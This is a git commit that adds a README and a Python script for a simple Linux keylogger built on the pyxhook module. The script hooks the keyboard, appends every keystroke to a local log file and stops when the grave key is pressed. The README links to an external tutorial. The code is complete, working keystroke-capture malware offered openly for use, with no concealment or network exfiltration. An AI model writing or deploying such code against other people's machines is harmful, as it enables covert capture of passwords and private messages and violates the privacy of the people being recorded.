b938f11ba78f605994a28a987898c255b3ee199c
Salah Assana <salahmassana@gmail.com>
2017-05-02 11:06:38 -0400

    renamed directory

---
+++ Keylogger/README.md
@@ -0,0 +1,7 @@
+# py-keylogger
+A Simple Keylogger for Linux  written in Python using the pyxhook module which is an implementation of pyhook module (Windows OS). 
+
+<h3>Requires:</h3> 
+python-xlib
+
+<h3>Installation & Tutorial:</h3><a href="http://www.techinfected.net/2015/10/how-to-make-simple-basic-keylogger-in-python-for-linux.html">Visit this LINK</a>
---
+++ Keylogger/keylogger.py
@@ -0,0 +1,34 @@
+"""
+Copyright (c) 2015, Aman Deep
+All rights reserved.
+
+
+A simple keylogger witten in python for linux platform
+All keystrokes are recorded in a log file.
+
+The program terminates when grave key(`) is pressed
+
+grave key is found below Esc key
+"""
+
+import pyxhook
+#change this to your log file's path
+log_file='/home/pi/Desktop/file.log'
+
+#this function is called everytime a key is pressed.
+def OnKeyPress(event):
+  fob=open(log_file,'a')
+  fob.write(event.Key)
+  fob.write('\n')
+
+  if event.Ascii==96: #96 is the ascii value of the grave key (`)
+    fob.close()
+    new_hook.cancel()
+#instantiate HookManager class
+new_hook=pyxhook.HookManager()
+#listen to all keystrokes
+new_hook.KeyDown=OnKeyPress
+#hook the keyboard
+new_hook.HookKeyboard()
+#start the session
+new_hook.start()
